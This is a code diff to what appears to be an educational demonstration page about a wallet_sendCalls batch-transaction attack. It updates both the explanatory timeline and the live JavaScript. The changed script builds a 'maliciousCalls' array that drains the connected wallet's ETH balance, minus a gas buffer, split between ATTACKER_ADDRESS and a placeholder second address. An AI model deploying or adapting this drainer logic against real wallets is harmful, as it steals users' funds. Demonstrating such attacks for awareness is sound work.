@@ -210,19 +210,23 @@
         <div class="tl-dot danger"></div>
         <div class="tl-title">Step 3: The malicious calls array</div>
         <div class="tl-desc">
-          While the contract is safe, the parameters aren't. The attacker constructed this batch:
+          While the contract is safe, the parameters aren't. The attacker constructed this batch with MULTIPLE calls executed atomically:
           <div class="code-block">
-<span class="code-comment">// calls array passed to wallet_sendCalls</span><br>
+<span class="code-comment">// Multiple calls in ONE atomic batch</span><br>
 [<br>
 &nbsp;&nbsp;{<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker...</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">victimETHBalance</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span> <span class="code-comment">// direct ETH sweep</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker1...</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">50% of balance</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
 &nbsp;&nbsp;},<br>
-&nbsp;&nbsp;<span class="code-comment">// More calls can be added here for tokens, NFTs, etc.</span><br>
+&nbsp;&nbsp;{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x1234567890...67890"</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">50% of balance</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;}<br>
 ]
           </div>
-          This executed atomically in one block. Your ETH balance was swept to the attacker's address before the transaction even finished.
+          All executed atomically in one transaction. Your entire ETH balance was distributed to attacker addresses before the transaction even finished.
         </div>
       </div>
       <div class="tl-item">
@@ -373,12 +377,19 @@
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
-      // Build malicious calls array
-      // ETH sweep to attacker address
+      // Build malicious calls array with MULTIPLE calls to trigger batch UI
+      // Call 1: Direct ETH sweep
+      // Call 2: Dummy call to another attacker wallet (demonstrates multi-recipient batch)
       const maliciousCalls = [
         {
           to: ATTACKER_ADDRESS,
-          value: "0x" + drainAmount.toString(16)
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: "0x"
+        },
+        {
+          to: "0x1234567890123456789012345678901234567890",  // Secondary attacker
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: "0x"
         }
       ];
 
